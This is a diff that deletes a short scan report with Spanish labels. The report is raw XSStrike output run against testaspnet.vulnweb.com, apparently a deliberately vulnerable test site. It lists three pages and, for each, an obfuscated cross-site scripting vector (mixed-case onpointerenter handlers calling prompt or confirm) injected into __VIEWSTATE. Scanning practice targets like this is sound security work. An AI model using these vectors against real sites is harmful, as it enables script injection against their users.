@@ -1,17 +1,0 @@
-🔗 URL: http://testaspnet.vulnweb.com/Comments.aspx?id=1337
-🧩 Parámetro afectado: id
-🎯 Payload: No identificado explícitamente
-🧾 Evidencia:
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing Comments.aspx?id=1337                    [0m[97m[~][0m Parsing about.aspx                               [0m[97m[~][0m Parsing rssFeed.aspx                             [0m[97m[~][0m Parsing Signup.aspx                              [0m[97m[~][0m Parsing javascript:__doPostBack(                 [0m[92m[++][91m Vulnerable webpage: [92mhttp://testaspnet.vulnweb.com/Comments.aspx?id=1337[0m [0m
-[92m[++][91m Vector for [92m__VIEWSTATE[0m: <a%0aoNPoiNTEReNtER+=+(prompt)``%0dx//v3dm0s [0m
-[92m[++][91m Vulnerable webpage: [92mhttp://testaspnet.vulnweb.com/about.aspx[0m [0m
-[92m[++][91m Vector for [92m__VIEWSTATE[0m: <dEtaIlS%0aOnPOiNTErenTEr%0d=%0d(confirm)()%0dx// [0m
-[92m[++][91m Vulnerable webpage: [92mhttp://testaspnet.vulnweb.com/Signup.aspx[0m [0m
-[92m[++][91m Vector for [92m__VIEWSTATE[0m: <d3v%0aonPoINtereNtEr%0a=%0aconfirm()%0dx//v3dm0s [0m
-[93m[!][0m Progress: 6/6 [0m
---------------------------------------------------
-
